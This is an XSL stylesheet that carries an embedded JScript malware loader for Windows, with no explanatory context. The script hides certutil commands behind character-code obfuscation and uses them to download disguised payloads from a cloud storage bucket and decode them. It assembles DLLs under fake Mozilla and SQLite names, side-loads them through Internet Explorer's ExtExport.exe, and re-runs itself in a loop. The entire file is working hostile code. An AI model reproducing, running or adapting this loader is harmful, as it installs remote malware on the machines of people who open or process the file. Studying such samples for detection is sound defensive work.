<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[		
			
	var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="System" version="4.0.0.0" publicKeyToken="B77A5C561934E089" /><clrClass clsid="{7D458845-B4B8-30CB-B2AD-FC4960FCDF81}" progid="System.Net.WebClient" threadingModel="Both" name="System.Net.WebClient" runtimeVersion="v4.0.30319" /></assembly>';
	
	try {
		var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
		ax.ManifestText = manifest;		
		var obj = ax.CreateObject("System.Net.WebClient");
	} catch(e) {
		
	}			
		
	var ak765;
	ak765 = "03/";	
	
	
	
    function bx021(min, max)
	{
     return Math.round(Math.random()*(max-min)+min)
	}	

	var cq854;
	var dro73;
	var ekw28;
	var ekw282;
	var fiq602;
	var tmp312;
	var gd481;
	var hx73;
	var irz593;
	var rwq015;
    cq854 = false; 
    dro73 = false; 
	var jk021 = new ActiveXObject("Scripting.FileSystemObject");
	var kpz8410 = new ActiveXObject("WScript.Shell");
    var ldp205 = new ActiveXObject("Shell.Application");
	

     function mrc430(url, file)
    {
		try
		{			
		 kpz8410.run(String.fromCharCode(99)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(117)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(108)+String.fromCharCode(46)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(101)+String.fromCharCode(32)+String.fromCharCode(45)+String.fromCharCode(117)+String.fromCharCode(114)+String.fromCharCode(108)+String.fromCharCode(99)+String.fromCharCode(97)+String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(101)+String.fromCharCode(32)+String.fromCharCode(45)+String.fromCharCode(115)+String.fromCharCode(112)+String.fromCharCode(108)+String.fromCharCode(105)+String.fromCharCode(116)+String.fromCharCode(32)+String.fromCharCode(45)+String.fromCharCode(102)+String.fromCharCode(32)+url+" "+file+".z",0,true); 
		 kpz8410.run(String.fromCharCode(99)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(117)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(108)+String.fromCharCode(32)+String.fromCharCode(45)+String.fromCharCode(100)+String.fromCharCode(101)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(100)+String.fromCharCode(101)+" "+file+".z "+file,0,true);
		 return true;
		}
        catch (ex)
        {		
         return false;
        }
        
    }	
	
	
	
function nts316(min)
{

dro73 = false; 


     ekw28 = "https://storage.googleapis.com/tianjin/"+ak765;


ekw282 = ekw28;

gd481 = "C:\\Users\\Public\\Libraries\\win32";
hx73 = "C:\\Users \\Public\\Libraries\\win32";
irz593 = "142_T3SL4S_"	


	try
	{
	var fso = new ActiveXObject("Scripting.FileSystemObject");  
	fso.CreateFolder(gd481);  
	}
    catch (ex)
    {
		
	}

	try
	{
	var fso = new ActiveXObject("Scripting.FileSystemObject");  
	fso.CreateFolder(hx73);  
	}
    catch (ex)
    {
		
	}

	
	try
	{    
     if (jk021.FileExists(gd481+"\\halawxtz64.dll")){	   
	   f = jk021.GetFile(gd481+"\\halawxtz64.dll");	   
	   if (f.size < 10 ){
		f.Delete();  
		f.Close();		
	   }
     }   
	}
    catch (ex)
    {
		
	}		 
   
	try
	{    
        if (!jk021.FileExists(gd481+"\\0142vrxi.log")){	   
	     f = jk021.GetFile(gd481+"\\halawxtz64.dll");	   
		 f.Delete();  
		 f.Close();		
        }   
	}
    catch (ex)
    {
		
	}	  


	try
	{    
        if (!jk021.FileExists(gd481+"\\0142refor.log")){	   
	      f = jk021.GetFile(gd481+"\\halawxtz64.dll");	   
		 f.Delete();  
		 f.Close();		
        }   
	}
    catch (ex)
    {
		
	}	  
   
     wpxa064 = "C:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe";
     wpxa032 = "C:\\Program Files\\Internet Explorer\\ExtExport.exe";

        if (jk021.FileExists(gd481+"\\halawxtzdwwn.gif")){	
            if (jk021.FileExists(gd481+"\\halawxtzg.gif")){			 
		        if (jk021.FileExists(gd481+"\\halawxtzxa.~")){		 
					if (jk021.FileExists(gd481+"\\halawxtzxb.~")){		 

						 if (jk021.FileExists(wpxa064)){						 	
						 try
						 {				  
						 kpz8410.run('"'+wpxa064+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 dro73 = true;             
						}
						
						
						 if (jk021.FileExists(wpxa032)){	

						 try
						 {				  
						 kpz8410.run('"'+wpxa032+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 			
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 dro73 = true;             
						}
						
					}
		        }
		    }
        }
     
     
  if (dro73 == false)
  { 

	try
	{
	 cq854 = mrc430(ekw28+"halawxtza.jpg.zip.log",gd481+"\\halawxtza.jpg");
        if (cq854 == false) {	
	     mrc430(ekw282+"halawxtza.jpg.zip.log",gd481+"\\halawxtza.jpg");
	    }
	}
    catch (ex)
    {
	
	}	


	try
	{
	 cq854 = mrc430(ekw28+"halawxtzb.jpg.zip.log",gd481+"\\halawxtzb.jpg");
        if (cq854 == false) {	
	     mrc430(ekw282+"halawxtzb.jpg.zip.log",gd481+"\\halawxtzb.jpg");
	    }
	}
    catch (ex)
    {
			
	}	
	

	try
	{
	 cq854 = mrc430(ekw28+"halawxtzc.jpg.zip.log",gd481+"\\halawxtzc.jpg");
        if (cq854 == false) {	
	     mrc430(ekw282+"halawxtzc.jpg.zip.log",gd481+"\\halawxtzc.jpg");
	    }
	}
    catch (ex)
    {
		
	}	


	try
	{
	 cq854 = mrc430(ekw28+"halawxtzdwwn.gif.zip.log",gd481+"\\halawxtzdwwn.gif");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzdwwn.gif.zip.log",gd481+"\\halawxtzdwwn.gif");
	    }
	}
    catch (ex)
    {
		
	}


	try
	{
	 cq854 = mrc430(ekw28+"halawxtzdx.gif.zip.log",gd481+"\\halawxtzdx.gif");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzdx.gif.zip.log",gd481+"\\halawxtzdx.gif");
	    }
	}
    catch (ex)
    {
		
	}

	try
	{
	 cq854 = mrc430(ekw28+"halawxtzg.gif.zip.log",gd481+"\\halawxtzg.gif");
        if (cq854 == false) {		 
	     mrc430(ekw282+"halawxtzg.gif.zip.log",gd481+"\\halawxtzg.gif");
	    }
	}
    catch (ex)
    {
		
	}
	

	try
	{
	 cq854 = mrc430(ekw28+"halawxtzgx.gif.zip.log",gd481+"\\halawxtzgx.gif");
        if (cq854 == false) {		 
	     mrc430(ekw282+"halawxtzgx.gif.zip.log",gd481+"\\halawxtzgx.gif");
	    }
	}
    catch (ex)
    {
		
	}

	
	
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzxa.gif.zip.log",gd481+"\\halawxtzxa.~");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzxa.gif.zip.log",gd481+"\\halawxtzxa.~");
	    }
	}
    catch (ex)
    {
	
	}	


	try
	{
	 cq854 = mrc430(ekw28+"halawxtzxb.gif.zip.log",gd481+"\\halawxtzxb.~");
        if (cq854 == false) {	 
	     mrc430(ekw282+"halawxtzxb.gif.zip.log",gd481+"\\halawxtzxb.~");
	    }
	}
    catch (ex)
    {
		
	}	

	
	
	kpz8410.run('cmd /V /C "echo '+irz593+'>'+gd481+'\\r1.log"&& exit',0,false); 



	
	rwq015 = bx021(1, 30);
	try
	{
	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"a.dll.zip.log",gd481+"\\halawxtz64a.dll");
	    if (cq854 == false) {
	     mrc430(ekw282+"halawxtzhh"+rwq015+"a.dll.zip.log",gd481+"\\halawxtz64a.dll");
	    }
	}
    catch (ex)
    {
		
	}	

	try
	{
	 cq854 = mrc430(ekw28+"halawxtzhh"+rwq015+"b.dll.zip.log",gd481+"\\halawxtz64b.dll");
	    if (cq854 == false) {
	     mrc430(ekw282+"halawxtzhh"+rwq015+"b.dll.zip.log",gd481+"\\halawxtz64b.dll");
	    }
	}
    catch (ex)
    {
		
	}	

	
	
						if (jk021.FileExists(wpxa064)){						 	
						 try
						 {		
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozcrt19.dll',0,true); 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozsqlite3.dll',0,true); 						 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > sqlite3.dll',0,true); 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > halawxtz64.dll',0,true);
						 
						 kpz8410.run('"'+wpxa064+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 dro73 = true;             
						}
						
						
						 if (jk021.FileExists(wpxa032)){	

						 try
						 {	
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozcrt19.dll',0,true); 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > mozsqlite3.dll',0,true); 						 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > sqlite3.dll',0,true); 
						 kpz8410.run('cmd.exe /c cd "'+gd481+'" && type halawxtz64a.dll halawxtz64b.dll > halawxtz64.dll',0,true); 					 
						 
						 kpz8410.run('"'+wpxa032+'" '+gd481+" "+bx021(0000001,999999999)+" "+bx021(3000001,999999999),0,true); 		
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 dro73 = true;             
						}
	
  }


kpz8410.run(String.fromCharCode(99)+String.fromCharCode(109)+String.fromCharCode(100)+String.fromCharCode(32)+String.fromCharCode(47)+String.fromCharCode(99)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(99)+String.fromCharCode(104)+String.fromCharCode(111)+String.fromCharCode(32)+String.fromCharCode(37)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(37)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(111)+String.fromCharCode(117)+String.fromCharCode(116)+String.fromCharCode(32)+String.fromCharCode(52)+String.fromCharCode(48)+String.fromCharCode(48)+String.fromCharCode(48)+String.fromCharCode(32)+String.fromCharCode(62)+String.fromCharCode(32)+String.fromCharCode(78)+String.fromCharCode(85)+String.fromCharCode(76)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(105)+String.fromCharCode(116),0,true); 
nts316(bx021(0000001,999999999));
}

nts316(bx021(0000001,999999999));

   
	
	]]> </ms:script>
</stylesheet>	
